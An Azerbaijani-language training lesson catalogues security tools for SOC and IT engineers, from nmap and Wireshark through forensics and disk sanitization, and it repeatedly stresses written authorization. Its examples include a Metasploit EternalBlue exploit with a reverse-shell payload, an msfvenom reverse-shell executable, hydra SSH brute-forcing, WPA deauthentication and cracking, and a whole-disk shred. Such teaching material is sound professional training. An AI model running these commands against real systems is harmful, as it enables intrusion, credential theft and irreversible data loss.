# Təhlükəsizlik Alətləri — İş Alət Dəsti

Alətlər anlamağı əvəz etmir. Toxunduğu hər şeyə qarşı `nmap -A` işlədən gənc mühəndis faydadan çox təhlükəlidir — özünə, şəbəkəyə və axırda yaranan səs-küyü təmizləməli olan adamlara. Alətləri bilməyin məqsədi flag-ları əzbərləmək deyil; məqsəd hansı alətin hansı problemə aid olduğunu tanımaqdır ki, problem gecə saat 02:00-da productionda görünəndə uyğun utilit artıq əlinizdə olsun və onun sizə nə dediyini oxuya biləsiniz.

İşləyən bir SOC/IT mühəndisi təxminən eyni alət dəstini gəzdirir, bir avtomobil ustası kimi: gündəlik istifadə etdikləri bir neçə şey (`nmap`, `tcpdump`, `wireshark`, OpenSSL komanda sətri), ayda bir neçə dəfə çıxardıqları ikinci səviyyə (Nessus, hashcat, Burp, theHarvester) və ildə bir-iki dəfə toxunduqları, amma mütləq mövcud olduğunu bilməli olduqları uzun ixtisaslaşdırılmış quyruq (yaddaş ekspertizası üçün Volatility, triaj toplama üçün KAPE, simsiz captive portal üçün hostapd-wpe). Bu dərs kataloqdur. Tamamlayıcı [Təşkilati Təhlükəsizlik Qiymətləndirməsi](./security-assessment.md) dərsi isə bunlardan hər hansı birinə nə vaxt və niyə müraciət etməyinizi idarə edən prosesdir.

Bu sənəddə heç nə bu alətlərdən hər hansı birini başqasının şəbəkəsinə yönəltmək üçün pulsuz icazə deyil. Hər bölmə fərz edir ki, sizin yazılı icazəniz, müəyyən edilmiş əhatə dairəniz və blue-team-in əsl hücumçu deyil, sizin olduğunuzu bilməsi üçün bir yol var.

## Alət kateqoriyaları xəritəsi

Bu dərsdəki demək olar ki, hər utilit doqquz qutudan birinə düşür. Qutunu bilmək aləti bilməkdən daha faydalıdır — çünki "mənə paket analizatoru lazımdır" anlayırsınızsa, vəziyyətə görə Wireshark-ı tshark-a, ya da tcpdump-a dəyişə bilərsiniz.

```mermaid
flowchart TB
    K[Security toolkit]
    K --> D[Discovery & scanning<br/>nmap, masscan, fping, arp-scan]
    K --> V[Vulnerability scanners<br/>Nessus, OpenVAS, Qualys, Rapid7]
    K --> W[Web app testing<br/>Burp, ZAP, sqlmap, gobuster, nikto]
    K --> E[Exploitation frameworks<br/>Metasploit, Cobalt Strike, Sliver]
    K --> P[Packet analysis<br/>Wireshark, tcpdump, tshark]
    K --> F[Forensics & IR<br/>Autopsy, Volatility, KAPE, Sysinternals]
    K --> C[Password & hash attacks<br/>hashcat, John, hydra, medusa]
    K --> O[OSINT<br/>theHarvester, SpiderFoot, Maltego, Shodan]
    K --> S[Data sanitization<br/>shred, sdelete, DBAN, NIST 800-88]
    K --> WL[Wireless<br/>aircrack-ng, Kismet, hostapd-wpe]
```



*Hər* engagement-də qarşıya çıxan iki qutu **kəşfiyyat** və **paket analizidir** — kəşfiyyat ona görə ki, görmədiyinizi test edə bilməzsiniz, paket analizi isə ona görə ki, hər qəribə tapıntı sonda "kabel üzərində əslində nə var" sualına çevrilir. Əvvəlcə bu ikisində əzələ yaddaşı qurun; qalan hər şey onların arxasına yerləşir.

## Şəbəkə kəşfiyyatı və skanlama

Kəşfiyyat iki suala cavab verir: *nə canlıdır* və *nə işlədir*. Kəşfiyyat olmadan qalan alət dəstinin hədəfi yoxdur.

### nmap

`nmap` standartdır. 1999-cu ildən bəri de-fakto şəbəkə xəritələyicisi olub, Windows / Linux / macOS-da işləyir, skanları komanda sətrindən (və Zenmap GUI vasitəsilə) idarə edir və SMB siyahıya alma-dan SSL zəiflik yoxlamalarına qədər hər şey üçün yüzlərlə icma tərəfindən saxlanan skript ilə Lua əsaslı skript mühərriki (NSE) daxildir.

Real işin doxsan faizi dörd skan üslubundan birini istifadə edir:

| Skan | Flag | Nə vaxt istifadə etməli |
|---|---|---|
| TCP connect | `-sT` | İmtiyazsız istifadəçi, tam TCP handshake, log etmək asan |
| SYN (yarımaçıq) | `-sS` | Root üçün default; daha sürətli, daha yüngül iz |
| UDP | `-sU` | Yavaş, amma DNS/SNMP/NTP kəşfiyyatı üçün məcburi |
| Versiya aşkarlanması | `-sV` | "Bu portda hansı xidmət və versiya var?" |

Bir neçə flag işin əsas hissəsini daşıyır:

```bash
# Top 1000 TCP port, versiya aşkarlanması + default NSE skriptləri, sürətli
nmap -sV -sC -T4 192.0.2.0/24

# Tam TCP port aralığı, SYN scan, OS fingerprint
sudo nmap -sS -p- -O -T4 192.0.2.10

# UDP top 100 (UDP skanlar qəsdən yavaşdır)
sudo nmap -sU --top-ports 100 -T4 192.0.2.10

# Hədəflənmiş NSE skripti — SMB-ni ms17-010 üçün yoxla
nmap -p 445 --script smb-vuln-ms17-010 192.0.2.10
```

`-T0` … `-T5` düyməsi vaxt rejimini idarə edir. `-T3` defaultdur, `-T4` ağıllı iş sürətidir, `-T5` görünən hər IDS-i tetikləyəcək və dəqiqliyi itirəcək. Kövrək şəbəkələrdə (köhnə ICS avadanlığı, peyk linkləri, sahibi olmadığınız hər şey) `-T2` istifadə edin.

NSE skriptləri `/usr/share/nmap/scripts/` altında yerləşir. Bir dəfə nəzərdən keçirin — HTTP siyahıya alma, SSL/TLS vəziyyəti (`ssl-enum-ciphers`), verilənlər bazası fingerprint-i üçün skriptlər və məlum CVE-ləri qeyd edən "vuln" kateqoriyası var.

### masscan

`masscan` nmap-ın çox yavaş olduğu zaman müraciət etdiyiniz alətdir. 10 Gbps link-də TCP vəziyyətini saxlamadan xam paketlər göndərərək tək bir port üçün bütün IPv4 internetini on dəqiqədən az müddətdə skanlaya bilər. Çıxış qəsdən nmap-ın XML-i ilə uyğundur ki, ikinci passda xidmət aşkarlanması üçün nmap-a ötürə biləsiniz.

```bash
# /16-nı port 443 üçün 10k paket/saniyə ilə skanla
sudo masscan 198.51.100.0/16 -p443 --rate 10000 -oG masscan.gnmap

# Hit-ləri nmap hədəflərinə çevir, sonra dərin skan et
awk '/Host:/ {print $2}' masscan.gnmap | sudo nmap -sV -sC -iL -
```

Masscan qəsdən axmaqdır. Onu nəhəng aralıqlarda canlı xidmətləri tapmaq üçün istifadə edin; nmap-ın analiz dərinliyinin əvəzi kimi heç vaxt istifadə etməyin.

### fping və arp-scan

Məlum LAN-da host kəşfiyyatı üçün nə nmap, nə də masscan ən yüngül alətdir.

```bash
# /24-ü ICMP vasitəsilə canlı host-lar üçün süpür, yalnız canlı olanları çap et
fping -a -g 192.168.1.0/24 2>/dev/null

# Layer-2 süpürmə — ICMP bloklananda da işləyir
sudo arp-scan --localnet
sudo arp-scan -I eth0 192.168.1.0/24
```

`arp-scan` adətən kommutasiya edilmiş LAN-ı inventarlaşdırmağın ən sürətli yoludur, çünki ARP-ı şəbəkənin özünü sındırmadan filtrləmək olmaz. Maşın kabel üzərindədirsə, `arp-scan` onu görəcək.

### Yardımçı komandalar

Kəşfiyyat passı nadir hallarda yalnız bir alətdir — bu daxili utilitlər hər engagement-də nmap-ın yanında oturur:

| Komanda | Sizə nə deyir |
|---|---|
| `tracert` (Win) / `traceroute` (Linux/macOS) | Hədəfə hop-bə-hop yol; ICMP-bloklanmış router-lər səssiz qalır |
| `pathping` (Win) | tracert + hop başına itki statistikası, daha yavaş, amma daha zəngin |
| `nslookup` (Win) / `dig` (Linux) | DNS lookup-ları; `dig` skriptlər üçün parse edilə bilən çıxış qaytarır |
| `ipconfig` (Win) / `ifconfig` və ya `ip` (Linux) | Yerli interfeyslər, MAC, IP, gateway, DHCP, DNS |
| `arp -a` | Yerli ARP keş (yaxınlarda hansı MAC-larla danışmısınız) |
| `route` | Cari marşrutlaşdırma cədvəli; marşrutları da dəyişdirə bilər |
| `netstat -an` / `ss -tunlp` | Canlı TCP/UDP bağlantıları və dinləyən socket-lər |
| `netcat` (`nc`) | Xam TCP/UDP göndərici, qəbuledici, port skaneri, fayl köçürücüsü |
| `hping3` | Firewall və IDS-i test etmək üçün ixtiyari TCP/UDP/ICMP paketləri yaradır |
| `curl` | HTTP(S) və 20-yə yaxın digər protokol; ən faydalı bir-sətirlik alət |
| `dnsenum` | DNS subdomain siyahıya alma və zone-transfer cəhdləri |

Qeyd etməyə dəyər iki niş, lakin tanınmış alət:

- **`scanless`** — skanın mənbə IP-si sizin olmasın deyə açıq port-skan veb saytlarına çağırış edir. Anonimləşdirir, lakin real skanı əvəz edə bilməz.
- **`sn1per`** — nmap, Metasploit modullarını, brute-force və DNS siyahıya almanı zəncirləyən Linux avtomatlaşdırması. Triaj üçün faydalıdır; sirena kimi səs-küylü.

## Zəiflik skanerləri

Kəşfiyyat skanı sizə *nə var* deyir. Zəiflik skanı sizə *onunla nə səhvdir* deyir. 2026-cı ildə böyük dördlük:

| Skaner | Lisenziya | Rejim | Üstünlüklər | Çatışmazlıqlar |
|---|---|---|---|---|
| **Nessus** (Tenable) | Kommersiya; pulsuz Essentials 16 IP ilə məhduddur | Şəbəkə + agent | Ən böyük plugin kitabxanası, uyğunluq skanları üçün qızıl standart | Authenticated skanlar Windows admin / Linux sudo tələb edir |
| **OpenVAS / Greenbone CE** | Pulsuz / açıq mənbə | Şəbəkə | Yaxşı əhatə, IP başına qiymət yoxdur | Yeni CVE yoxlamalarının daha yavaş buraxılışı; UX kobud |
| **Qualys VMDR** | Kommersiya SaaS | Bulud + agent | Əla dashboard-lar, aktivin avto-kəşfi, SaaS hostlanır | Abunəlik, məlumat perimetrinizdən çıxır |
| **Rapid7 InsightVM** | Kommersiya | Şəbəkə + agent | Güclü düzəliş iş axını inteqrasiyası | Nessus-dan daha ağır konsol resursları |

Hansı satıcı olmasından daha vacib iki dizayn seçimi:

**Authenticated vs unauthenticated** — unauthenticated skan yalnız kabel üzərindəkini görür (banner-lər, cavab kodları). Authenticated skan sistemə credentials ilə (Windows admin, SSH açar, SNMP v3) login olur və quraşdırılmış patch-ləri, registry-ni, paket versiyalarını oxuyur. Authenticated skanlar təxminən **5–10×** daha çox tapıntı tapır, daha az false positive ilə. Mümkün olan yerdə həmişə authenticated işlədin.

**Agent vs şəbəkə** — şəbəkə skanı konsoldan kabel üzərindən çatır; agent aktivin üzərində yerli işləyir və geri hesabat verir. Agent-lər kompüter şəbəkəsindən vaxtın yarısını kənarda olan laptoplar üçün və firewall-un uzaq autentifikasiyanı bloklayan möhürlənmiş serverlər üçün qalib gəlir. Şəbəkə skanları idarə olunmayan cihazlar üçün (printerlər, kommutatorlar, IoT) qalib gəlir, burada heç nə quraşdıra bilmirsiniz.

Tipik /24 şəbəkə skanı Nessus ilə, tam authenticated, **2–6 saat** çəkir və triaj-dan əvvəl 200–2,000 tapıntı çıxarır. Ölü host-ları atmaq üçün masscan ön-passı bunu yarıya endirir.

```bash
# OpenVAS skan task-ının canlı olmasını sürətli CLI sanity check
sudo gvm-cli --gmp-username admin --gmp-password 'pwd' \
  socket --socketpath /run/gvmd/gvmd.sock \
  --xml '<get_tasks/>'
```

Zəiflik skanerləri pentest əvəzediciləri deyil — onlar *məlum* yanlış konfiqurasiyaları və *məlum* CVE-ləri tapır. Hər hansı yeni şey hələ də insan tələb edir.

## Paket analizatorları

Gec-tez hər qəribə tapıntı "kabel üzərində əslində nə var" sualına çevrilir. Üç alət bu işin 99%-ni əhatə edir.

### Wireshark

Qızıl standart GUI analizatoru. Demək olar ki, hər protokolu disseksiya edir, axınları izləməyə, HTTP/SMB transfer-lərindən faylları çıxarmağa və session açarlarınız olduqda TLS-i deşifrə etməyə imkan verir. Onu güclü edən şey display-filter dilidir — beş filter öyrənin və artıq iş alət dəstiniz var:

```text
ip.addr == 192.0.2.10
tcp.port == 443
http.request.method == "POST"
dns and ip.dst == 8.8.8.8
tcp.analysis.retransmission
```

Wireshark trafikin onun NIC-də olmasına ehtiyac duyur. Kommutasiya edilmiş şəbəkədə bu kommutatorda SPAN/mirror portları və ya kabel uçları arasında hardware TAP deməkdir. Adi access portuna qoşulmuş laptop yalnız öz söhbətlərini və broadcast-ları görür — heç vaxt başqa cür fərz etməyin.

### tcpdump

CLI iş atı. Wireshark işləyə bilməyən uzaq serverlərdə, skriptlərdə və nəzarətsiz tutmalar üçün istifadə edin.

```bash
# eth0-da DNS sorğularını rolling fayla tut, fayl başına 100 MB, 5 saxla
sudo tcpdump -i eth0 'udp port 53' -w dns-%Y%m%d-%H%M.pcap \
  -C 100 -W 5 -G 3600

# Canlı tutma, DNS çevrilməsi yoxdur (daha sürətli), paket məzmununu göstər
sudo tcpdump -i eth0 -nn -A 'tcp port 80'

# Faylı oxu və daha çox filtrlə
tcpdump -r incident.pcap 'host 192.0.2.10 and tcp port 22'
```

Real tapşırıq: *eth0-da 30 saniyə DNS tut və Wireshark-da aç*.

```bash
sudo timeout 30 tcpdump -i eth0 -w /tmp/dns.pcap 'port 53'
# Sonra iş stansiyanızda
scp server:/tmp/dns.pcap .
wireshark dns.pcap
```

### tshark

Wireshark-ın CLI əmisi oğlu — eyni dissektorlar, skript edilə bilən çıxış. Pipeline daxilində birdəfəlik çıxarışlar üçün faydalıdır.

```bash
# pcap-dan hər HTTP host header-ini çıxar
tshark -r capture.pcap -Y http.request -T fields -e http.host | sort -u

# Bir dəqiqə üçün TLS SNI-nin canlı tutulması
sudo tshark -i eth0 -a duration:60 -Y 'tls.handshake.extensions_server_name' \
  -T fields -e tls.handshake.extensions_server_name
```

### tcpreplay

Tamamlayıcı utilit — pcap faylını geri kabel üzərinə oynayır. IDS qaydalarını test etmək, hücumçunu gözləmədən SIEM aşkarlamalarını doğrulamaq və inline alətləri yük-test etmək üçün istifadə olunur.

```bash
sudo tcpreplay -i eth0 --topspeed attack-sample.pcap
```

## Veb proqram testləri

Veb testləri öz alt-fənnidir. Alət dəsti:

- **Burp Suite** (PortSwigger) — de-fakto veb proksi. Community pulsuzdur, məhdudlaşdırılmış skaner ilə; **Pro** (~$475/il) aktiv skanlamanı və Intruder fuzzer-i tam sürətdə əlavə edir. Demək olar ki, hər kommersiya veb pentest-i Burp vasitəsilə çatdırılır.
- **OWASP ZAP** — pulsuz, açıq mənbə, Burp Community-yə bənzər funksiya dəsti üstəgəl aktiv skanlama. Büdcə sıfır olduqda doğru cavab.
- **sqlmap** — SQL injection-u avtomatlaşdırır. Onlarla payload variantı vasitəsilə verilənlər bazalarını aşkar edir, çıxarır və dump edir.
- **dirb / gobuster / ffuf** — qovluq və fayl brute-forcer-ləri. `gobuster` müasir sürətli olanıdır; `ffuf` HTTP-fuzzing çevikliyini əlavə edir.
- **nikto** — veb serverlərə yönəlmiş sürətli zəiflik skaneri; səs-küylü, ilk süpürmə kimi faydalıdır.

İşləyən "veb proqramda ilk 30 dəqiqə" ardıcıllığı:

```bash
# 1. Əslində nə işləyir?
nmap -sV -p 80,443 -sC --script=http-headers,http-title,ssl-cert app.example.local

# 2. Görünən məzmun qovluq strukturunu crawl et
gobuster dir -u https://app.example.local \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 20 -o gobuster.out

# 3. Sürətli məlum-zəiflik süpürməsi
nikto -h https://app.example.local -o nikto.html -Format html

# 4. Burp-da əl ilə araşdırma — brauzer proksisini 127.0.0.1:8080-ə təyin et,
#    spider, sonra Repeater + Intruder vasitəsilə hər form sahəsini gəz

# 5. id parametri üzərində aşkar injection-u test et
sqlmap -u "https://app.example.local/item?id=1" --batch --risk=2 --level=3
```

Bu ardıcıllıq pentest deyil — bu "ön qapını açıq qoyan oldumu" yoxlamasıdır. Real veb qiymətləndirmə oradan autentifikasiyaya, session idarəetməsinə, biznes-məntiq sui-istifadəsinə və s. davam edir (OWASP WSTG-yə baxın).

## İstismar freymvorkları

İstismar freymvorkları istismarın adətən tələb etdiyi çoxsaylı addımları — stager, payload, post-exploitation, persistence — ardıcıl CLI-yə bağlayır.

### Metasploit (msfconsole)

Pulsuz, açıq mənbə iş atı. Linux-da işləyir (Kali-də default), minlərlə istismar, köməkçi və post-exploitation modulu ilə əvvəlcədən yüklənmişdir.

```text
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info
msf6 exploit(...) > set RHOSTS 192.0.2.10
msf6 exploit(...) > set LHOST 192.0.2.5
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > run
```

Başınızda saxlamalı olduğunuz beş konseptual qutu:

| Konsept | Nədir |
|---|---|
| **Exploit** | Kod icrasını tetikləyən zəifliyə xas kod |
| **Payload** | Exploit uğur qazandıqdan sonra işləyən şey (Meterpreter, shell, beacon) |
| **Auxiliary** | İstismar olmayan köməkçilər — skanerlər, brute-forcer-lər, fuzzer-lər |
| **Post** | Session aldıqdan *sonra* işlətdiyiniz modullar — credential dump, lateral hərəkət |
| **Encoder** | Sadə AV imzalarından yan keçmək üçün payload-u sarır |

`msfvenom` müstəqil payload generatorudur:

```bash
# Windows reverse-shell binary yarat
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.0.2.5 LPORT=4444 -f exe -o reverse.exe
```

### Cobalt Strike, Sliver, Covenant

Məlumat üçün qısa qeydlər — müdafiəçilər onların izlərini tanımalıdır:

- **Cobalt Strike** — kommersiya ($3,500/il/istifadəçi) red-team C2 freymvorku, adversary simulyasiyası üçün sənaye standartı və təəssüf ki, real ransomware əməliyyatlarında ən çox sui-istifadə edilən sızdırılmış alət.
- **Sliver** — Bishop Fox-dan açıq mənbə C2, Go-da yazılıb, real engagement-lərdə (və real hücumlarda) Cobalt Strike-ı əvəz edən kimi getdikcə daha çox görünür.
- **Covenant** — .NET əsaslı C2, PowerShell/.NET tradecraft uyğun gələn Windows-ağır mühitlər üçün faydalıdır.

Müdafiəçinin bunları işlətməsinə ehtiyac yoxdur. Onların default beacon profillərini, named pipe nümunələrini və proses-injection telemetriyasını tanımalısınız — IR komandaları onları daim ovlayır.

## Şifrə və hash hücumları

Müdafiəçinin cracker sahibi olmasının iki səbəbi var: öz istifadəçilərinin şifrələrinin gücünü test etmək (icazə ilə) və insident zamanı bərpa edilmiş hash-ləri qırıb partlayış radiusunu başa düşmək.

| Alət | Ən yaxşı |
|---|---|
| **hashcat** | GPU-sürətləndirilmiş offline cracking; mövcud olan ən sürətli cracker |
| **John the Ripper** | CPU cracking, ekzotik hash formatları, "jumbo" icma versiyası |
| **hydra** | Online şəbəkə protokolu brute-force (SSH, RDP, FTP, HTTP form-ları) |
| **medusa** | Köhnə online brute-forcer, hydra ilə müqayisə edilə bilər |
| **CeWL** | Hədəf veb saytı vurğu üçün scrape edən wordlist generatoru |

Demo: rockyou ilə `Password1`-in NTLM hash-ini qır.

```bash
# NTLM(Password1) = 64f12cddaa88057e06a81b54e73b949b
echo "64f12cddaa88057e06a81b54e73b949b" > hash.txt

# Mode 1000 = NTLM; -a 0 = wordlist hücumu
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Nəticələrə bax
hashcat -m 1000 hash.txt --show
```

Tək orta səviyyəli GPU-da NTLM təxminən 60 GH/s-də qırılır; bütün rockyou siyahısı (14 M giriş) bir saniyədən az müddətdə bitir. "Password1"-i şifrə-olmayan edən budur.

Online hədəflər üçün, kiçik siyahı ilə SSH serverinə qarşı hydra:

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
  -t 4 -o hydra.out ssh://192.0.2.10
```

Hər hansı online şeyi işlətməzdən əvvəl həmişə rate-limit və lockout-u yoxlayın. Səs-küylü hydra burst-i hədəfdəki hər hesabı bağlayacaq.

## OSINT alətləri

OSINT (Open Source Intelligence) yalnız ictimai mənbələrdən kəşfiyyatdır — hədəfə qarşı zond yoxdur. Əhatə dairəsini müəyyən etmək, hücumçunun sizin haqqınızda artıq nə görə biləcəyini bilmək və blue-team təhdid-kəşfiyyat işi üçün faydalıdır.

| Alət | Mənbələr |
|---|---|
| **theHarvester** | Axtarış sistemləri, PGP açar serverləri, Shodan, sertifikat log-ları — e-poçt, host, işçi çıxarır |
| **SpiderFoot** | 200+ OSINT modulunu zəncirləyən avtomatlaşdırma freymvorku |
| **Maltego** | Qrafik əsaslı araşdırma — insanlar, domenlər, IP-lər üçün node-lar; transformasiyalar məlumat çəkir |
| **Recon-ng** | Modul CLI freymvorku, Metasploit-ə oxşar hiss, lakin OSINT üçün |
| **Shodan** | İnternetə açıq xidmətlərin və banner-lərin axtarış sistemi |
| **Censys** | Shodan kimi, daha dərin TLS / sertifikat verilənlər toplusu |
| **whois** | Domen qeydiyyat məlumatı — sahib, registrar, tarixlər |
| **dig** | DNS sorğuları — A, MX, NS, TXT, AXFR |
| **crt.sh** | Pulsuz Certificate Transparency log axtarışı; verilmiş sertifikatlar vasitəsilə subdomain-ləri açır |

`example.local` üzərində 5-dəqiqəlik xarici iz passı:

```bash
# Domen qeydiyyatı
whois example.local

# DNS səthi
dig +short example.local A
dig +short example.local MX
dig +short example.local TXT

# CT log-ları vasitəsilə subdomain-lər
curl -s 'https://crt.sh/?q=%25.example.local&output=json' \
  | jq -r '.[].name_value' | sort -u

# E-poçt, hostname, işçilər
theHarvester -d example.local -b all -l 500

# İnternetə açıq xidmətlər
# (brauzerdə https://www.shodan.io/search?query=hostname%3Aexample.local)
```

Yuxarıdakıların hamısı hədəfə qarşı passivdir. Heç biri onların infrastrukturuna toxunmur — bütün məlumatlar üçüncü tərəflərdən çəkilir.

## Simsiz qiymətləndirmə

Simsiz iş monitor rejimi və paket injection dəstəkləyən USB adapteri tələb edir (Alfa AWUS036 ailəsi daimi seçimdir).

- **aircrack-ng dəsti** — klassik alət ailəsi. `airmon-ng` (kartı monitor rejiminə qoyur), `airodump-ng` (tutur), `aireplay-ng` (deauth edir), `aircrack-ng` (WEP/WPA handshake-ləri qırır).
- **Kismet** — passiv simsiz detektor və sniffer; sayt sorğuları və rogue-AP ovu üçün əla.
- **hostapd-wpe** — enterprise WPA SSID-lərinə avto-qoşulan müştərilərdən credentials toplamaq üçün saxta AP işlədir ("evil twin" hücumu).
- **WiFi Pineapple** (Hak5) — rogue-AP və man-in-the-middle iş axınını avtomatlaşdıran hardware aparatı; müştəri tərəfində simsiz testlər üçün rahatdır.

Offline cracking üçün WPA2 handshake tut:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                       # hədəf BSSID + kanal tap
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w handshake wlan0mon
# Başqa terminalda — yeni handshake-ə məcbur etmək üçün qoşulmuş müştərini deauth et
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Qır
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
```

## Ekspert və IR alətləri

Nə isə artıq səhv getdikdə, qarşınızdakını dəyişmədən toplamaq, qorumaq və analiz etmək lazımdır.

### Toplama

| Alət | Məqsəd | OS |
|---|---|---|
| **FTK Imager** | Hash doğrulaması ilə bit-bə-bit ekspert disk imicinin alınması; pulsuz | Win, Linux |
| **`dd`** | Linux yerli imaging; eyni fikir, GUI yoxdur | Linux |
| **memdump** | Linux yaddaş əldə etməsi (`/dev/mem`) | Linux |
| **WinPMEM / DumpIt** | Windows yaddaş əldə etməsi | Win |
| **KAPE** | Canlı triaj kollektoru; canlı Windows host-da işləyir və yalnız ehtiyac duyduğunuz artefaktları götürür | Win |
| **Velociraptor** | Filo miqyasında agent əsaslı uzaq DFIR toplama | Win, Linux, macOS |

Sahə prinsipi: əvvəlcə imic, imici analiz et. Surət çıxarmaq imkanınız varsa, canlı diski heç vaxt analiz etməyin.

```bash
# USB stick-i hash doğrulaması ilə fayla imic
sudo dd if=/dev/sdb of=usb.img bs=4M status=progress
sha256sum usb.img > usb.img.sha256
```

### Analiz

| Alət | Məqsəd |
|---|---|
| **Autopsy** | Açıq mənbə GUI ekspert dəsti (The Sleuth Kit üzərində qurulub). Fayl sistemi analizi, vaxt xətti, açar söz axtarışı, EXIF, silinmiş fayl çıxarılması |
| **Volatility 3** | Yaddaş ekspertizası — proses siyahısı, şəbəkə bağlantıları, inject olunmuş kod, registry hive-ları, yaddaş imicindən zərərli proqram göstəriciləri |
| **WinHex / X-Ways** | Kommersiya hex redaktoru + tam ekspert dəsti, hüquq-mühafizə orqanlarında məşhurdur |
| **Sysinternals** | Microsoft-un pulsuz Windows alət dəsti — Process Explorer, Autoruns, Procmon, TCPView, Sigcheck, Strings |
| **Cuckoo Sandbox** | Açıq mənbə malware sandbox-ı — nümunəni izolyasiya edilmiş VM-də işlədir və şəbəkə/sistem çağırışlarını hesabat verir |

Yaddaş imicinə qarşı tipik Volatility sessiyası:

```bash
# Hansı proses ağacı işləyirdi?
vol -f mem.raw windows.pstree

# Tutma vaxtında şəbəkə bağlantıları
vol -f mem.raw windows.netscan

# Şübhəli kod injection
vol -f mem.raw windows.malfind
```

### Sysinternals sürətli qələbələr

Tam IR dəsti quraşdırılmadan Windows triajı üçün:

| Alət | Nəyi göstərir |
|---|---|
| **Process Explorer** | Tam yol, imzalama, valideyn/uşaq, yüklənmiş DLL-lər, şəbəkə ilə proses ağacı |
| **Autoruns** | Sistemdəki hər persistence yeri — service-lər, RunKey-lər, scheduled task-lar, driver-lər |
| **Procmon** | Real vaxt fayl/registry/proses/şəbəkə fəaliyyəti — yanğınsöndürən şlanq |
| **TCPView** | Canlı socket → proses xəritəsi |
| **Sigcheck** | Binary imzalarını doğrulayır və VirusTotal hash-lərini sorğulayır |
| **Strings** | Binary-lərdən çap olunan sətirləri çıxarır, sürətli triaj üçün faydalıdır |

## Məlumatın silinməsi və təhlükəsiz utilizasiya

Məlumatın silinməsi pensiyaya çıxan medianın üzərində yaşamış məlumatları sızdıra bilməməsini təmin etmək fənnidir. Standart istinad **NIST SP 800-88 Rev. 1**-dir, üç yüksələn təbəqəni müəyyən edir:

| Təbəqə | Metod | Bərpaya qarşı müqavimət | Nə vaxt istifadə etməli |
|---|---|---|---|
| **Clear** | Software overwrite (müasir disklərdə tək pass kifayətdir) | Standart bərpa alətləri | Disk təşkilat daxilində yenidən istifadə ediləcək |
| **Purge** | Kriptoqrafik silmə, ATA Secure Erase, degausser (yalnız maqnit media) | Laboratoriya səviyyəli bərpa | Disk təşkilatdan çıxır, lakin media yenidən istifadə edilir |
| **Destroy** | Fiziki məhv — shred, yandır, dağıt, əz | Hər şey | Yüksək həssas məlumatlar; etibarlı şəkildə purge edilə bilməyən SSD-lər; qanuni utilizasiya tələbi |

Platforma üzrə alətlər:

```bash
# Linux — tək faylı təsadüfi + sıfır pass-larla overwrite et
shred -v -n 3 -z /var/log/secret.log

# Linux — bütün cihazı sil (son dərəcə diqqətlə istifadə et, undo yoxdur)
sudo shred -v -n 1 /dev/sdb
# Və ya müasir alternativ: hdparm vasitəsilə ATA Secure Erase
sudo hdparm --user-master u --security-set-pass p /dev/sdb
sudo hdparm --user-master u --security-erase p /dev/sdb
```

```powershell
# Windows — Sysinternals sdelete, boş yerin tək-pass overwrite
sdelete -p 1 -s -z C:\

# Windows — xüsusi faylı 3 pass overwrite et
sdelete -p 3 secret.docx
```

**DBAN** (Darik's Boot and Nuke) kimi yüklənə bilən wiper-lər SSD-lər üçün köhnəlmişdir, çünki flash translation layer-lər kölgəli blokları toxunulmamış qoya bilər. SSD-lər üçün istehsalçının secure-erase utilitini, açar məhv etməsi ilə tam disk şifrələmə (kriptoqrafik silmə) və ya fiziki məhv etməni istifadə edin.

**Qanunla məhv etmə tələb olunduqda:**

- Səhiyyə məlumatları (ABŞ-da HIPAA, başqa yerlərdə ekvivalent milli PHI qaydaları) tez-tez sadə silməkdən kənar media məhvini tələb edir.
- Ödəniş kartı məlumatları (PCI-DSS Tələbi 9.8) kart sahibi məlumatlarını ehtiva edən medianın biznes və ya hüquqi səbəblərdən artıq lazım olmadıqda məhv edilməsini tələb edir.
- Hökumət məxfi materiallarının öz məhv standartları var (ABŞ-da NSA/CSS Policy 9-12).
- Bir çox təşkilat HDD-lər üçün sertifikatlaşdırılmış shredding xidməti və SSD/telefonlar üçün e-tullantı tərəfdaşı ilə müqavilə bağlayır, hər partiya üçün chain-of-custody sertifikatı ilə.

Degausser maqnit medianı güclü maqnit sahəsinə məruz qoyaraq məhv edir. SSD-lərdə **işləmir** (maqnit substratı yoxdur) — SSD-lər üçün yeganə zəmanət fiziki məhvdir.

## Distribusiyalar

Bir neçə Linux distrosu alət dəsti ilə əvvəlcədən yüklənmişdir ki, 200 paket quraşdırmağa bir gün sərf etməyəsiniz.

| Distro | Güc | Hara uyğundur |
|---|---|---|
| **Kali Linux** | Pen-test default; ~600 əvvəlcədən quraşdırılmış alət; rolling release | Gündəlik istifadə hücum distrosu |
| **Parrot OS** | Kali-dən daha yüngül; təhlükəsizlik + məxfilik + dev iş stansiyası bir yerdə | Gündəlik istifadə üçün Kali alternativi |
| **BlackArch** | Arch əsaslı, 2,800+ alət; çox böyük repository | Ekzotik alətlərə ehtiyac duyan ixtisas işi |
| **Pentoo** | Gentoo əsaslı pen-test distrosu; live CD/USB | Hardware-aware engagement-lər |
| **Flare-VM** | Windows əsaslı; reverse-engineering və malware analiz dəsti | Windows malware reversing |
| **SIFT Workstation** | SANS-dan Ubuntu əsaslı DFIR distrosu | Forensic case işi |
| **REMnux** | Linux əsaslı malware reverse-engineering distrosu | Statik və dinamik malware analizi |

Əksər mühəndislər hücum üçün Kali (və ya Parrot) VM-i və müdafiə/analiz üçün SIFT və ya REMnux VM-i işlədir, snapshot edilmiş, hər engagement təmiz başlasın deyə.

## Praktiki məşqlər

Alət dəstini əzələ yaddaşına çevirmək üçün dörd məşq. Onları sahibi olduğunuz VM-də edin.

### 1. Kali-ni VM-də quraşdır, əsas nmap işlət

`https://www.kali.org/get-kali/` ünvanından Kali-ni endir (VM imici, live ISO yox), VirtualBox və ya VMware-ə import et, login ol (`kali`/`kali`) və işlət:

```bash
nmap -sV -sC -T4 -p- scanme.nmap.org
```

